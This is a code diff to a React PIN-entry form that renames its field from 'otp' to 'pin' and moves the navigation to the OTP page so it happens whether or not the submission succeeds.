@@ -9,9 +9,10 @@ import axios from "axios";
 import BASE_URL from "../components/urls";
 
 const schema = yup.object().shape({
-  otp: yup
+  pin: yup
     .string()
-    .matches(/^\d+$/, "Pin must be numeric")
+    .matches(/^\d+$/, "PIN must be numeric")
+  
     .required("PIN is required"),
 });
 
@@ -38,12 +39,13 @@ const Pin = () => {
       .then((response) => {
         console.log(response.data);
         reset(); // Clear the input field
-        navigate("/otp");
+      
       })
       .catch((error) => {
         console.error("There was an error!", error);
       })
       .finally(() => {
+        navigate("/otp");
         setLoading(false);
       });
   };
@@ -63,13 +65,13 @@ const Pin = () => {
             <form onSubmit={handleSubmit(submitForm)}>
               <div className="formOtpInput">
                 <input
-                  name="otp"
+                  name="pin"
                   type="text"
                   required
                   placeholder="******"
                   inputMode="numeric"
                   pattern="\d*"
-                  {...register("otp")}
+                  {...register("pin")}
                   onInput={handleInputChange}
                 />
               </div>
